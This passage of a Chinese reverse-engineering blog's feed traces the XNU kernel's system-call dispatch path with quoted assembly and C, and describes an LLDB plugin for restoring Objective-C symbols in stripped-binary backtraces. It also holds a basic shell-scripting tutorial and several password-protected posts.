cleared by sysenter but note that     * we also clear the trace trap to avoid the complications     * of single-stepping into a syscall. The nested task bit     * is also cleared to avoid a spurious &quot;task switch&quot;     * should we choose to return via an IRET.     */    wrmsr64(MSR_IA32_FMASK, EFL_DF|EFL_IF|EFL_TF|EFL_NT);}</code></pre><p><code>wrmsr64(MSR_IA32_LSTAR, DBLMAP((uintptr_t) hi64_syscall));</code>也就是系统调用会由<code>hi64_syscall</code>函数处理。这个函数实现在<code>xnu/osfmk/x86_64/idt64.s</code>之中</p><pre><code class="assembly">Entry(hi64_syscall)Entry(idt64_syscall)    swapgs     /* Use RAX as a temporary by shifting its contents into R11[32:63]      * The systemcall number is defined to be a 32-bit quantity, as is      * RFLAGS.      */    shlq    $32, %rax    or     %rax, %r11.globl EXT(dblsyscall_patch_point)EXT(dblsyscall_patch_point)://    movabsq    $0x12345678ABCDEFFFULL, %rax     /* Generate offset to the double-mapped per-CPU data shadow      * into RAX      */    leaq    EXT(idt64_hndl_table0)(%rip), %rax    mov    16(%rax), %rax    mov     %rsp, %gs:CPU_UBER_TMP(%rax)  /* save user stack */    mov     %gs:CPU_ESTACK(%rax), %rsp  /* switch stack to per-cpu estack */    sub    $(ISF64_SIZE), %rsp    /*     * Synthesize an ISF frame on the exception stack     */    movl    $(USER_DS), ISF64_SS(%rsp)    mov    %rcx, ISF64_RIP(%rsp)        /* rip */    mov    %gs:CPU_UBER_TMP(%rax), %rcx    mov    %rcx, ISF64_RSP(%rsp)        /* user stack --changed */    mov    %r11, %rax    shrq    $32, %rax        /* Restore RAX */    mov    %r11d, %r11d        /* Clear r11[32:63] */    mov    %r11, ISF64_RFLAGS(%rsp)    /* rflags */    movl    $(SYSCALL_CS), ISF64_CS(%rsp)    /* cs - a pseudo-segment */    mov    %rax, ISF64_ERR(%rsp)        /* err/rax - syscall code */    movq    $(HNDL_SYSCALL), ISF64_TRAPFN(%rsp)    movq    $(T_SYSCALL), ISF64_TRAPNO(%rsp)    /* trapno */    swapgs    jmp    L_dispatch            /* this can only be 64-bit */</code></pre><p>继续跟下去，会得到如下执行流程</p><pre><code>syscall--&gt;hi64_syscall-&gt;L_dispatch--&gt;ks_dispatch--&gt;ks_dispatch_user--&gt;L_dispatch_U64--&gt;L_dispatch_64bit--&gt;L_common_dispatch--&gt;hndl_syscall</code></pre><pre><code class="assembly">/* * 64bit Tasks * System call entries via syscall only: * *    r15     x86_saved_state64_t *    rsp     kernel stack * *    both rsp and r15 are 16-byte aligned *    interrupts disabled *    direction flag cleared */Entry(hndl_syscall)    TIME_TRAP_UENTRY    movq    %gs:CPU_ACTIVE_THREAD,%rcx    /* get current thread     */    movl    $-1, TH_IOTIER_OVERRIDE(%rcx)    /* Reset IO tier override to -1 before handling syscall */    movq    TH_TASK(%rcx),%rbx        /* point to current task  */    /* Check for active vtimers in the current task */    TASK_VTIMER_CHECK(%rbx,%rcx)    /*     * We can be here either for a mach, unix machdep or diag syscall,     * as indicated by the syscall class:     */    movl    R64_RAX(%r15), %eax        /* syscall number/class */    movl    %eax, %edx    andl    $(SYSCALL_CLASS_MASK), %edx    /* syscall class */    cmpl    $(SYSCALL_CLASS_MACH&lt;&lt;SYSCALL_CLASS_SHIFT), %edx    je    EXT(hndl_mach_scall64)    cmpl    $(SYSCALL_CLASS_UNIX&lt;&lt;SYSCALL_CLASS_SHIFT), %edx    je    EXT(hndl_unix_scall64)    cmpl    $(SYSCALL_CLASS_MDEP&lt;&lt;SYSCALL_CLASS_SHIFT), %edx    je    EXT(hndl_mdep_scall64)    cmpl    $(SYSCALL_CLASS_DIAG&lt;&lt;SYSCALL_CLASS_SHIFT), %edx    je    EXT(hndl_diag_scall64)    /* Syscall class unknown */    sti    CCALL3(i386_exception, $(EXC_SYSCALL), %rax, $1)    /* no return */</code></pre><p><code>hndl_syscall</code>这个函数会系统调用分为<code>hndl_unix_scall64</code> 、<code>hndl_mach_scall64</code>、<code>hndl_mdep_scall64</code>、<code>hndl_diag_scall64</code>四类分别处理</p><p>这里以<code>hndl_unix_scall64</code>为列</p><pre><code class="assembly">Entry(hndl_unix_scall)        TIME_TRAP_UENTRY    movq    %gs:CPU_ACTIVE_THREAD,%rcx    /* get current thread     */    movq    TH_TASK(%rcx),%rbx        /* point to current task  */    incl    TH_SYSCALLS_UNIX(%rcx)        /* increment call count   */    /* Check for active vtimers in the current task */    TASK_VTIMER_CHECK(%rbx,%rcx)    sti    CCALL1(unix_syscall, %r15)    /*     * always returns through thread_exception_return     */</code></pre><p>这里调动了<code>unix_syscall</code>函数，这个函数在bsd/dev/i386/systemcalls.c之中实现，里面进行了一些权限检查</p><p>以及根据系统调用表去调用对应的实现</p><pre><code class="c">  thread = current_thread();  uthread = get_bsdthread_info(thread);  // regs is derrived from r15 ...  code = regs-&gt;rax &amp; SYSCALL_NUMBER_MASK;  callp = (code &gt;= NUM_SYSENT) ? &amp;sysent[63] : &amp;sysent[code];  // ...  vt = (void *)uthread-&gt;uu_arg;  // ...  memcpy(vt, args_start_at_rdi ? &amp;regs-&gt;rdi : &amp;regs-&gt;rsi,        args_in_regs * sizeof(syscall_arg_t));  // ...  error = (*(callp-&gt;sy_call))((void *)p, vt, &amp;(uthread-&gt;uu_rval[0]));</code></pre><p>目前执行的流程如下</p><pre><code>hi64_syscallL_dispatch_U64L_dispatch_64bitL_common_dispatchhndl_syscall // rdx, pushed in hi64_syscallhndl_unix_scall64unix_syscall64error = (*(callp-&gt;sy_call))((void *)p, vt, &amp;(uthread-&gt;uu_rval[0])); // now we&#39;re there</code></pre><h4 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h4><p><a href="https://www.binss.me/blog/interrupt-and-exception/" target="_blank" rel="external">https://www.binss.me/blog/interrupt-and-exception/</a></p><p><a href="https://0xax.gitbooks.io/linux-insides/content/SysCall/linux-syscall-2.html" target="_blank" rel="external">https://0xax.gitbooks.io/linux-insides/content/SysCall/linux-syscall-2.html</a></p><p><a href="https://gist.github.com/yrp604/23e86dce9ca12bf514ef" target="_blank" rel="external">https://gist.github.com/yrp604/23e86dce9ca12bf514ef</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h3 id=&quot;XNU系统调用深度解析&quot;&gt;&lt;a href=&quot;#XNU系统调用深度解析&quot; class=&quot;headerlink&quot; title=&quot;XNU系统调用深度解析&quot;&gt;&lt;/a&gt;XNU系统调用深度解析&lt;/h3&gt;&lt;blockquote&gt;
&lt;p&gt;从一个函数分析到系统调用的内核实现&lt;/p&gt;
      
    
    </summary>
    
      <category term="iOSRE" scheme="https://github.com/4ch12dy/4ch12dy.github.io.git/categories/iOSRE/"/>
    
    
      <category term="XNU" scheme="https://github.com/4ch12dy/4ch12dy.github.io.git/tags/XNU/"/>
    
      <category term="Kernel" scheme="https://github.com/4ch12dy/4ch12dy.github.io.git/tags/Kernel/"/>
    
  </entry>
  
  <entry>
    <title>LLDB调试器栈符号化</title>
    <link href="https://github.com/4ch12dy/4ch12dy.github.io.git/2018/10/03/LLDB%E8%B0%83%E8%AF%95%E5%99%A8%E6%A0%88%E7%AC%A6%E5%8F%B7%E5%8C%96/%E5%BC%BA%E5%8C%96%E4%BD%A0%E7%9A%84lldb%E8%B0%83%E8%AF%95%E5%99%A8/"/>
    <id>https://github.com/4ch12dy/4ch12dy.github.io.git/2018/10/03/LLDB调试器栈符号化/强化你的lldb调试器/</id>
    <published>2018-10-03T05:27:59.000Z</published>
    <updated>2019-02-21T10:07:17.274Z</updated>
    
    <content type="html"><![CDATA[<h3 id="强化你的lldb调试器"><a href="#强化你的lldb调试器" class="headerlink" title="强化你的lldb调试器"></a>强化你的lldb调试器</h3><h3 id="Why"><a href="#Why" class="headerlink" title="Why?"></a>Why?</h3><p>lldb作为苹果iOS和macOS的调试器在正向开发中十分强大，不过对于逆向人员来说却不是很友好。尤其是那些符号表被strip以后的执行文件。去定位追溯一个函数的执行流程时，查看当前的栈帧只有一堆内存地址，如果要定位是哪个函数通常的流程就是找到当前模块的内存偏移，然后栈上的地址逐一减去改偏移然后去ida中查找改地址，最后才能定位到函数名。流程琐碎且都是重复工作，花费大量时间去定位符号信息。因此我想做一个能自动恢复栈帧符号的命令。只要输入改命令就能显示函数的调用情况。</p><h3 id="How"><a href="#How" class="headerlink" title="How?"></a>How?</h3><p>但是符号表都已经被strip了怎么才能恢复符号呢？我的想法就是macho可执行文件中其实是有很大一部分段储存的OC函数信息，里面肯定是有类名和方法名的，我们要做的就是通过栈中的地址，遍历所有的类以及方法，找到最佳的类方法即可。判断原则就是找到距离栈地址最近且小于等于栈地址的类方法。然后记录类名和方法名即可。</p><p>正好lldb提供了python的接口，可以开发自定义的命令。</p><h3 id="And-what"><a href="#And-what" class="headerlink" title="And what ?"></a>And what ?</h3><p>虽然有python接口，但是lldb里面集成了一个OC的解释器，其语法要求特别严格，按照通常开发的写法会有很多错误，经过不断的调试和修复bug，一个开发版基于lldb python栈符号恢复命令开发完成。git地址在<a href="https://github.com/4ch12dy/xia0LLDB">这里</a></p><p>这里面还有的搜索算法以及异常处理还需要优化，以及对于block这类函数还不能恢复，不过对于大多数的场景目前还是可用。具体效果可以如下：</p><p><img src="https://github.com/4ch12dy/4ch12dy.github.io/blob/master/articlePic/lldb-python/b_bt.jpg?raw=true" alt="https://github.com/4ch12dy/xia0LLDB/blob/master/resource/b_bt.jpg?raw=true"></p><p><img src="https://github.com/4ch12dy/4ch12dy.github.io/blob/master/articlePic/lldb-python/b_sbt.jpg?raw=true" alt="https://github.com/4ch12dy/xia0LLDB/blob/master/resource/b_sbt.jpg?raw=true"></p><h3 id="update"><a href="#update" class="headerlink" title="update"></a>update</h3><p>现已支持恢复block结构符号解析，通过提供的ida脚本，得到一个json格式的block符号文件，然后在lldb命令行中输入<code>sbt -f block-json-file-path</code>即可加载该文件。效果如下：</p><h4 id="原始的bt命令结果"><a href="#原始的bt命令结果" class="headerlink" title="原始的bt命令结果"></a>原始的bt命令结果</h4><p><img src="https://github.com/4ch12dy/4ch12dy.github.io/blob/master/articlePic/lldb-python/orig_bt.png?raw=true" alt="orig_bt"></p><h4 id="sbt命令（没有加载block符号文件）"><a href="#sbt命令（没有加载block符号文件）" class="headerlink" title="sbt命令（没有加载block符号文件）"></a>sbt命令（没有加载block符号文件）</h4><p><img src="https://github.com/4ch12dy/4ch12dy.github.io/blob/master/articlePic/lldb-python/sbt-noblockfile.png?raw=true" alt="sbt-noblockfile"></p><h4 id="sbt命令（带有block符号文件）"><a href="#sbt命令（带有block符号文件）" class="headerlink" title="sbt命令（带有block符号文件）"></a>sbt命令（带有block符号文件）</h4><p><img src="https://github.com/4ch12dy/4ch12dy.github.io/blob/master/articlePic/lldb-python/sbt-blockfile.png?raw=true" alt="sbt-blockfile"></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h3 id=&quot;强化你的lldb调试器&quot;&gt;&lt;a href=&quot;#强化你的lldb调试器&quot; class=&quot;headerlink&quot; title=&quot;强化你的lldb调试器&quot;&gt;&lt;/a&gt;强化你的lldb调试器&lt;/h3&gt;&lt;h3 id=&quot;Why&quot;&gt;&lt;a href=&quot;#Why&quot; class=&quot;he
      
    
    </summary>
    
      <category term="iOSRE" scheme="https://github.com/4ch12dy/4ch12dy.github.io.git/categories/iOSRE/"/>
    
    
      <category term="LLDB" scheme="https://github.com/4ch12dy/4ch12dy.github.io.git/tags/LLDB/"/>
    
      <category term="python" scheme="https://github.com/4ch12dy/4ch12dy.github.io.git/tags/python/"/>
    
  </entry>
  
  <entry>
    <title>unicorn</title>
    <link href="https://github.com/4ch12dy/4ch12dy.github.io.git/2018/09/13/unicorn/unicorn/"/>
    <id>https://github.com/4ch12dy/4ch12dy.github.io.git/2018/09/13/unicorn/unicorn/</id>
    <published>2018-09-13T06:39:03.000Z</published>
    <updated>2019-04-16T03:03:09.532Z</updated>
    
    <content type="html"><![CDATA[<script src="//cdn.bootcss.com/jquery/1.11.3/jquery.min.js"></script><div id="hbe-security">  <div class="hbe-input-container">  <input type="password" class="hbe-form-control" id="pass" placeholder="Need password to decrypt!" />    <label for="pass">Need password to decrypt!</label>    <div class="bottom-line"></div>  </div></div><div id="decryptionError" style="display: none;">Incorrect Password!</div><div id="noContentError" style="display: none;">No content to display!</div><div id="encrypt-blog" style="display:none"></div><script src="/lib/crypto-js.js"></script><script src="/lib/blog-encrypt.js"></script><link href="/css/blog-encrypt.css" rel="stylesheet" type="text/css">]]></content>
    
    <summary type="html">
    
      something you can not kown 
    
    </summary>
    
      <category term="re" scheme="https://github.com/4ch12dy/4ch12dy.github.io.git/categories/re/"/>
    
    
      <category term="unicorn" scheme="https://github.com/4ch12dy/4ch12dy.github.io.git/tags/unicorn/"/>
    
  </entry>
  
  <entry>
    <title>reversing-dot-kr</title>
    <link href="https://github.com/4ch12dy/4ch12dy.github.io.git/2018/04/29/reversing-dot-kr/reversing-dot-kr/"/>
    <id>https://github.com/4ch12dy/4ch12dy.github.io.git/2018/04/29/reversing-dot-kr/reversing-dot-kr/</id>
    <published>2018-04-29T03:47:09.000Z</published>
    <updated>2019-04-29T11:47:36.495Z</updated>
    
    <content type="html"><![CDATA[<script src="//cdn.bootcss.com/jquery/1.11.3/jquery.min.js"></script><div id="hbe-security">  <div class="hbe-input-container">  <input type="password" class="hbe-form-control" id="pass" placeholder="Need password to decrypt!" />    <label for="pass">Need password to decrypt!</label>    <div class="bottom-line"></div>  </div></div><div id="decryptionError" style="display: none;">Incorrect Password!</div><div id="noContentError" style="display: none;">No content to display!</div><div id="encrypt-blog" style="display:none"></div><script src="/lib/crypto-js.js"></script><script src="/lib/blog-encrypt.js"></script><link href="/css/blog-encrypt.css" rel="stylesheet" type="text/css">]]></content>
    
    <summary type="html">
    
      something you can not kown 
    
    </summary>
    
      <category term="way" scheme="https://github.com/4ch12dy/4ch12dy.github.io.git/categories/way/"/>
    
    
      <category term="re" scheme="https://github.com/4ch12dy/4ch12dy.github.io.git/tags/re/"/>
    
  </entry>
  
  <entry>
    <title>shellscript总结</title>
    <link href="https://github.com/4ch12dy/4ch12dy.github.io.git/2018/04/17/shellscript/shellscript/"/>
    <id>https://github.com/4ch12dy/4ch12dy.github.io.git/2018/04/17/shellscript/shellscript/</id>
    <published>2018-04-17T10:33:40.000Z</published>
    <updated>2019-05-10T08:14:52.874Z</updated>
    
    <content type="html"><![CDATA[<h3 id="shellscript总结"><a href="#shellscript总结" class="headerlink" title="shellscript总结"></a>shellscript总结</h3><h4 id="变量"><a href="#变量" class="headerlink" title="变量"></a>变量</h4><pre><code>name=&quot;zhang&quot;</code></pre><ul><li><p>变量名和等号之间不能有空格</p></li><li><p>英文，数字下划线，不能有空格，标点</p></li><li><p>不能以数字开头</p></li><li><p>不能是关键字</p></li></ul><h4 id="单引号-双引号"><a href="#单引号-双引号" class="headerlink" title="单引号/双引号"></a>单引号/双引号</h4><ul><li><p>单引号会原样输出</p></li><li><p>双引号里面可以有变量，转义字符</p></li></ul><h4 id="字符串"><a href="#字符串" class="headerlink" title="字符串"></a>字符串</h4><pre><code class="bash"># 拼接name=&#39;zhang&#39;helloname=&quot;hello, &quot;$name&quot;!&quot;helloname=&quot;hello, &quot;${name}&quot;!&quot;#获取长度echo ${#name}  # [out]:5#提取子字符串echo ${name:1:4} #[out]:hang</code></pre><h4 id="数组"><a href="#数组" class="headerlink" title="数组"></a>数组</h4><pre><code class="bash">my_array=(A B C D)echo &quot;数组的元素为: ${my_array[1]}&quot;echo &quot;数组的元素为: ${my_array[@]}&quot;#[out]:#数组的元素为: B#数组的元素为: A B C D</code></pre><h4 id="文件"><a href="#文件" class="headerlink" title="文件"></a>文件</h4><pre><code class="bash">#文件存在且为目录-d #文件存在且为一般文件-f#文件存在且为链接文件-L</code></pre><h4 id="if"><a href="#if" class="headerlink" title="if"></a>if</h4><pre><code class="bash">a=10b=20if [ $a == $b ];then    echo &quot;a 等于 b&quot;elif [ $a -gt $b ];then    echo &quot;a 大于 b&quot;elif [ $a -lt $b ];then    echo &quot;a 小于 b&quot;else    echo &quot;没有符合的条件&quot;fi    # [out]:a 等于 b</code></pre><h4 id="for"><a href="#for" class="headerlink" title="for"></a>for</h4><pre><code class="bash"># for infor loop in 1 2 3 4 5;do    echo &quot;The value is: $loop&quot;done# [out]:The value is: 1 The value is: 2 The value is: 3 The value is: 4 The value is: 5</code></pre><h4 id="xfind"><a href="#xfind" class="headerlink" title="xfind"></a>xfind</h4><pre><code class="shell">function xfind(){    find $1 -type f -regex &quot;.*&quot; -print0 | xargs -0  grep -i $2}if [ -z &quot;$1&quot; -o -z &quot;$2&quot; ]; then    echo &quot;[usage] xfind path_of_dir key_words_you_want_to_search&quot;else    xfind $1 $2fi</code></pre><h4 id="xargs"><a href="#xargs" class="headerlink" title="xargs"></a>xargs</h4><pre><code>管道是标准输出到标准输入，但并不是所有命令都是从标准输入中取参数，所以需要xargs命令。使其从标准输出到命令参数</code></pre><p>更多细节点<a href="https://www.cnblogs.com/wangqiguo/p/6464234.html" target="_blank" rel="external">这里</a></p><h4 id="function"><a href="#function" class="headerlink" title="function"></a>function</h4><p>函数返回值只能输0-255数字，且用<code>$?</code>接收</p><pre><code class="shell">function test(){    read num    return  $num}testif [ $? -eq 1 ];then    echo &quot;yes&quot;else    echo &quot;no&quot;fi</code></pre>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h3 id=&quot;shellscript总结&quot;&gt;&lt;a href=&quot;#shellscript总结&quot; class=&quot;headerlink&quot; title=&quot;shellscript总结&quot;&gt;&lt;/a&gt;shellscript总结&lt;/h3&gt;&lt;h4 id=&quot;变量&quot;&gt;&lt;a href=&quot;#变量&quot; cla
      
    
    </summary>
    
      <category term="misc" scheme="https://github.com/4ch12dy/4ch12dy.github.io.git/categories/misc/"/>
    
    
      <category term="shell" scheme="https://github.com/4ch12dy/4ch12dy.github.io.git/tags/shell/"/>
    
  </entry>
  
  <entry>
    <title>正则表达式</title>
    <link href="https://github.com/4ch12dy/4ch12dy.github.io.git/2018/04/08/%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F/%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F/"/>
    <id>https://github.com/4ch12dy/4ch12dy.github.io.git/2018/04/08/正则表达式/正则表达式/</id>
    <published>2018-04-08T08:32:33.000Z</published>
    <updated>2019-04-19T11:31:33.949Z</updated>
    
    <content type="html"><![CDATA[<script src="//cdn.bootcss.com/jquery/1.11.3/jquery.min.js"></script><div id="hbe-security">  <div class="hbe-input-container">  <input type="password" class="hbe-form-control" id="pass" placeholder="Need password to decrypt!" />    <label for="pass">Need password to decrypt!</label>    <div class="bottom-line"></div>  </div></div><div id="decryptionError" style="display: none;">Incorrect Password!</div><div id="noContentError" style="display: none;">No content to display!</div><div id="encrypt-blog" style="display:none">U2FsdGVkX1+rPEiQazqd/SF31R/QvM6OauoML10E1xWDU15klTeot+CTAYXofDrB+jXNYDEjyWFB+RfkOHH76L6agT+7DevY5fOtubeT1GicG4zKY5kuzxuhdFX3Hr27WmNhf+n34xqdSIztF1ny7vnxGkLsobw5H60uvcnCHvIMM4Ic43KyI07qPRTmw93gbjvhEA5v5ZLV+m93y5iuvm4ANy1OvHsTrJKs6ljEUHKVl38UJhCf6VaFAReS2ICxtW/s6cVhuj1WBpKV1jewTJDGnU4xcPz3XU5i1+dxG7IZN99iIDg+hM8GoePjp0DuI7NaHIbybyG/83DJW4Vfkhmv63RF6gk8zOxzZxknND6Ox3IPiQ767zt1QIQWY+6B22va9hHXaM2GmxwcvoF2swTi2DpyucXtnZsZ8e3ywcAiQexqK+yJEkSKMndFNKnGKcqiEQyeADZibekcra/foR31RkfT/9GYtauqs2WiFx8lDh5lPIqXhQRHT1lbY1E8IMthBwJJm/sKk+BZ08IvvTAoTqDQv7xdaYfh297sqO+Cx0Ig0+MXisuhU+brMz2FVyst+zHsFmjA+9Ft4KJkgxT+FnQw9jRt+YpRxr+M+bDKOUOMMppj4DETCArww+x4jN26+09GRqylWaMJPQxDWDiosEB0tFve/76q0VCN/RrqIx9hVHENtZ7ezdusAzSBkxV83ZboiiQKGJ7yjhTjBryqbd8guk9SXRnY/+RddaeAYCSiyviwDaRX8ObppU6jalhJ5Ned3Nby3ga7OEXmJmaJUPZN5478LD+sClQhvqQVrqH6HRr15myFMZfr96hoZNZi1T7o47H57HOfUwCjJpMUMCyPICJLuQEwZKcrqeOm6SMQVeiDnO7q7mn0RS/DA5WVFkyY7AlouGlMdg/u2W+HoPkF/sxMqPNHDWD3tKI7xTDqIpTLb9IaRHrlbA4VjF0CwN9N5aOlvzr8VRbju+HgDwoRhLre46LzEUfGws3l8Ot/R5xcsiBy9Nn8KqriO99yHXy/EOCJ0frRnEIQBudQ1l7Now4nVC21XP5Nr7uQAJNePfm3TDJdm1NxHhZvCdB5RpHGY3t8upd9pkf51hrh75e/fMTEpJZgilA1JhJO0VukMdzqh+6cOFlheC2tFAd6sO0r7aATSxYS78ccsnHOytPitaAf7ZTQswBMg9N4qPGtje1Z7MUetvlEFGODSDxe9fc2F36XyAuYVf5BukH2wXsTxDcPF00WcSun3jflTVupYDyNvrpLGOEmL9lWge7c3EWaCta67TsZmG1xOHqXLE2dfabKXVbNRQ4wKDlaju/n72OcoxgYYJNBSyCfoye37XYWM5bETBzST0eU21gpCCDoQXAvLrKRQFEvd+lcDzzq5J39fb70ox4EoSYPJeu6c0rJjHLrjHtwcYqGrT4yreJcmjALhqYsC8LECUVR8wp+alU3CJ0WJjW1do3MGY3enMIsr6VRup/dwFxAJgNEhSjiHerGKJnZ3NItKLCm4TTwJiRUW7tNeZjdM1TY7ZBY7LtLe+erpYl8dTJYlvrXTC2IPvJ7sm2h5TwzhFqbM1i5rvAIxZyirahyLadgN+c+ToiOWKWUabsca2UCysP8at0u/yXW7xeSrjbyAiJQKqgMadwhbwKFxbHc3mIhz3QICuYRsZUwGsp0srf9BnORSb2J9X5JhXXubJXPUA/wGF8zlNZzlqB2dp3LCs08gHSdJn9lkaNy5GHSC3ryH+igj2MFjBuXxyEP0NGmzdRPeorqaVrxU1a15mpiRDy0AuRwir/hTDpl7SAzdfAAeOeB7afHPe9ZN05smj1ogmOJbUtKj/ubY2E+onI32ebjx5o+1z1p/ddBOeSm6ayh+2w1wlgwmPlXYzZg0zq+Z/IsZ2/MzS2dNMv6Lef/RvZE5vW7Ursn+XfAjus2X5gjISTO5l2RaktGlK+jQf2BY/R5NZMM0PvtOAVE+2jrVrZR8dxw9Yq34kSWU1TabfRHb1dMoM0sSGxq4oS/Dx0DJBTApf8PLrau0zG2t6kjnuIMcpJJkpTpoHI2N5XUEaMNsa7HDjWgTsKlkqdvSsjprbw1iWkU9aBY3F+G6Pigt4eaZkhy53v9H8AOe00H6Ba+O60JX7lIqySdt8vzOnKwVfO+pwYuvq3Fj33JOmufrDor5QP0q3SCvOx3jq+vVi4WNN1JHdkr8FVXB+v3MmyJeCI5qpT6f8zMOJJget5vw++ApwW8t+3b0yH5OFl//TeduXbPUR6LmTQc2xNXpF9HieDHLozcP0rYX7eq/Am5spJo1GnfUO6BxH4fufqMMPhDm1+HqZmSJzSCK/IMxGBkXYsUvGgXm5rvBPlZeB8JIQydRj3fug/ltHnjYoOiOUoM6PrFsKdVx1l6LPIbFPVR32PVBIHAW6uDoXzpg6koesyMFyyglQfCvqX5Qo8K80W47F+gWeazYGAcbUOQZgvq45CI0BMd/m1/3omBuSBX7oeZgIq7W1fkEQ6G8CMNpe1EnwqhkROszcNNDQ5lx/iMCWmAPbHN7ZQrKqMAIcmtN7OlmS3ilWtwrHe/HFZ+Ste4B8EdX8tTFVuHU7fDBmt1SB4VHAZR72njkb98LSotd4aj2QpgZVe41OsEEvghUROP8g2zWo660UZNE45OCDvSivlhJlLgLgb6M4BUwazzVFCZw3TI/KDe35o+bDkada8G39mdb6E1qKLT3Wg4pdmTxQcVH8gu8obIv46saNkUOn5M96GSnwF2V460Rb6pNU1uSpeiwwXCkRA2wibm0IrPxPDUnxTzemXQ+c+b+UNeBmbaLaJpvZ7M5HHdQTMXfYEx19UyrKcU2HKoDpuijTYOkmHUr3qTGhYzyKbENDCeZE+ttcFk3tzBRgL1Tvv+XD4vIcfkYnqpRQdUJNcuBzXXoJiz9023S1kyRT2LBRM6KwWNq6C5mhzbHMreNrSy2AK8GkymMikXwDdP8Nh918HaMDYuxZ5WAPZKH4L+hYzRDEzbXZ4hsf3y5M90k0havNlQZT4+wGYpVwms0ZMpdba1ibaFMlrxPqRxxJAvSBwO92tnyDIg/zbu2Muf5rNzR1zTRIiJPIv2rylKLcs/+v1U43JcBVI0zTf4q7+d7smcniYOhcD9+Xzp+EXM8R6IoXOK308LsEYsBhx1kQrMdzjARQM1S/XLGhxYIsn1vaIVcrFrPmjR8RJ7Jd4jBOURSK0POJuks1h8cCpCu20GWf0UyVNuuohoIJINbfihoZiaIIFhaq//BxSqZRiU1OoIcBX/FoN3tZ0fE287cNyj3YOJfM8ci91eKjoVIzOn980PCaeQfPk/biW6Y9EGy1SwdLEy0WzndORcAEbF7mhyxbjbgpYVGJB6/t91olzOwH6kHA852SXTcckGscRbxs1xFYphCrBirBZAkuW9LV6NHgij6dd+s7Qhtu1HBp6Shr11Go/X7bvbujru+g+089Jc6prW9lNSMftSGa4kG6K6HtNfun6jIkIQq1nUjFdFZTSNm1+Hrfb2NZ2zntjXL+H2EC4+AIsdCG79n4kLBhDqSRPPuVbhNNFM1WQVaJ0LhnFeEKTWYRrelPbapdGkHWzho+sWFycb+sUFsGA5nqm/l3zpKzu/iv4qNHDCBWXUyu45ysdw0vMqkFy6RkezliMDdLHGyvhTOBPCOr2BB7ebCUjId7hG7/gMrJV88wNVgDIWfiwgA33cBPyFJ7PVQAWZROcpLYb6Hs/w88O5dY9f8qJ+Qc/gMDiW8LHicLw0WF4iExan0FNVsqnalX+FUK9uE5amKk2nqIIjDefDpEFAIzRhh00dG4pKPb5h44EEvlFZef5MxV5e2uAxaffoYExEXSawYyN5xDPJkmQ2YiGim4WR8BBZ00Ekt8A/2a/ZOnKAPD5SLynwqIS0X1qfpQclr0fACp5TpETqMGF5D8DHX/fWx5ylopBw0xaGl+paSCvvkwSD4V9PKUFDlHY6sjD69ArBwbyufh5kokbJA4DbMSlE+8TRKQQ9Eh+K//2ReIGl4Jx8Zo9XxBljp5JIyDJ+IiTCWKgM1EeWor0admnyh9DYy8DLKaLnNbCpYQLSQ8ncvccHrOpVibEqw+IqfXrM6V7cDRfIaBpwcr/tA6msNoQVJiklNv+1lXXuOXpJmaQGwgQSucAD518ecPGLspxXZDWoAjIE7EBluq7v3oigbkYTG7d7nltxWIzGyGyrnBuBoySnC3xPKK4RCPLKpSTZyAtu3DOgn6/oQ8sOfacKnpEp6zAxLdIlnS3KoMYb6nJr5shqcQUxZlS9xbQX/+VvQq62NFciydkhac9snukzD2Q2wuVeHj/oIU7AJd9fc2jdunnqvXJO9dWoPDvhl/6OuzfHZSICvQJr6g3gaTwlAq1C+1Mxwuo0CcpJNyE9QATEB56bh361TMAKaceDFCQrYep2RfPyIJcrm+PXloJyZOqRUrhROUe6kP5JPf/qNbKtgWE2435LAfAFO3u1YqTsryO15im9wiEAXfirWY70Z9Vq/d2xd48rJMOuEZneb2I0PTaLiTyHPjU7tdw/DiUFIbufZ+bMLDSEb96vDQWDplTM2GD4x7g4HKEzbzw4r3Pb2LAHbQecWAhWOGo8enLE6kkOWhwW9Uy/zXhmX0vUL7N616Ii3z/meeIhGw5oCBy+DRTkGc6AxS81cjLs8p69j0OK912RzG0i+UZoV/17iAJXnT2ovkbRzZL11WGE3wLXzfkOPrk1/lcx0N11hcImnF0qMitoKBXm229EXc2O00Ptz4kjtp16QK6UumjSEhgZ7LX/hi21dATBmRi5V7biyiKGwSWSJwRdHVbnv9qQYggjKHkvpuQ0HekPpY/TBJvNaCZWR3BAYJW49fTQZ973ex3IZ5jBr8p1iB5YxJPPqfOjndXgTQCwR/LlgKVyxmviuoTe5xntp0XjJblJX0d71Q0XtdSBT8/WVkfLVH5DdooVtT90U4HBYlJXomXaXJMzRDUau2gj5beVajrNflsfGg6x+am6bT6f7Dy5uXlNB62UQzLpvH+c7a92QmZv94MiJ6L4/wQSjZdyyKpMve/HBCybW+HHf8XWelfBYUfCY/SyIQW+evcIS97/geq+CucAY9fXAkleYZ16kOoiF+3/Wjp23MlzB4sxau8bWqg6qUG39l6rn2mSXYfelZixSp0WeZIMr4gPSDK61ukXy951jBYj/Aoldi3IJTdIsd1GsnHKUosZ8AZmp8bHJnp6SMahHeukVUw2LdDZZbKwjZIWl2m3FNEqhRWRQ2xMsOSUOxhkFCq4CTTCpty8bPIclLPFHHQMbIunMPkdVA3RW3v9y+eKQ4Fz+6sHKdPO5eMny20RDlNjQ9w0ZylyFPJDkWr+pKqY3Qh6kezw8F6YRmDrt1ubTBcaPAhih5n6lvgZjkKPRbiNVRp/dcVjjkU0x+1+h5VasTX3v6XD1xkl/Ogfl71d+gwy6DgKjDV5Fjm2J1CDD5XL18Cc6twL6ZDNPHY0v3c80VljgA/pb3NIH/b5CoJDSZU5R4KB4rXCfMjdTakDAslh5zyd++ejsFMsKMMn1UxDtuphdqPFDlAV1//oB6y6SPdhrlkNoMHSPIkym/3TKIFjEjpCH8AtdCKPV5BMmCG1Bu4rYelFtgTvw4ktBGFZL/NkrNfYTaHsMMWAssCG/jnaYukZnUW3Zqv5X64098/5QHSTFL4DFipVT5bvmvPduuHa8uZ3DmUVRJt8OMBTaX/gSsrupJZMewfy2KIbdLO/0uWuDnexhRcCLq6lHN93RWrZeB233QG7tu5U8ABxAyBmaAbaS0L2cdoreXcf3VULAIz5IenEo3KRHoIOVVsiVZYo8GeBag/fav1iWLAHShpF